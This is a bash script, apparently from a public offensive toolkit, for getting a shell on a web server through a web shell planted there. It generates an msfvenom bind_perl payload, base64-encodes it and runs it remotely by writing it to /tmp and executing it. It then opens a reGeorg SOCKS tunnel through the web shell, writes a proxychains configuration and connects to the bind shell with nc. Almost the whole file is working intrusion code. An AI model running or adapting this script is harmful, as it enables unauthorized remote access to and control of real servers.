# getBashShell_proxychains_http_tunnel
# sh tools/getBashShell_proxychains_http_tunnel.sh http://xxx:9002/uddi/.O01542895480635.jsp
# git clone https://github.com/hktalent/myhktools.git
# payload: cmd/unix/bind_awk
# linuxPays=(`msfvenom -l payloads|grep bind|grep -E '(linux|unix)'|grep -Ev '(ipv6|random)'|awk '{print $1}'`)
# cmd/unix/bind_perl
# msfvenom -l payloads |grep bind|grep windows|grep -Ev '(ipv6|random)'|awk '{print $1}'
# msfvenom --list formats
# /msfvenom -p linux/armbe/shell_bind_tcp lport=4444
# cmd/brace
# msfvenom --encoder cmd/brace --arch cmd --platform unix -p  cmd/unix/bind_awk lport=4444 -f raw
# linux/x86/shell/bind_tcp
lport="30399"
echo "wait msfvenom ..."
xxP=`msfvenom -p cmd/unix/bind_perl lport=${lport} -f raw 2>/dev/null|base64|tr -d "\n"`
# netstat -antp|grep ${lport}|grep -Eo \"[0-9]{1,}/perl\"|sed 's/\/perl//g'|xargs -I % kill -9 %;
szTmp1="echo \"${xxP}\"|base64 -d >/tmp/xx;chmod +x /tmp/xx;/tmp/xx;netstat -antp|grep ${lport}"
# xxP1=`urlencode2 "${szTmp1}"`
url="$1"
# url2="${url}?ls=${xxP1}"
echo "wait remoute run cmd/unix/bind_perl"
szCmd="node tools/doCmdIps.js --url ${url}  -c '${szTmp1}'"
# echo $szCmd
chkRst=`$szCmd`
# chkRst=`curl -k -s -q "${url2}"`
echo "result:[${chkRst}]"
if [ "${chkRst}" != "" ];
then
lanIp=`echo $chkRst|grep -Eo "[0-9]{1,3}2\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|head -n 1`
echo "LanIp: ${lanIp}" 
echo "target server Listen:"
echo $chkRst|sed 's/<.*>//g'
tmxName="httpTunnel"
tmux new -s $tmxName -d

tmux send -t $tmxName "py2 py/reGeorgSocksProxy.py  -p 1909 -u  ${url}?ls=whoami" Enter
cat <<EOT> ./proxychains.conf
random_chain
proxy_dns 
quiet_mode
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
[ProxyList]
socks4 127.0.0.1	 1909

EOT
echo "wait 5 sec"
sleep 5 &
wait ${!}
echo "start nc ..."
proxychains nc -nv $lanIp ${lport}

# for i in ${lanIp[@]}
# do
# proxychains nc -nv $i ${lport}
# done
fi
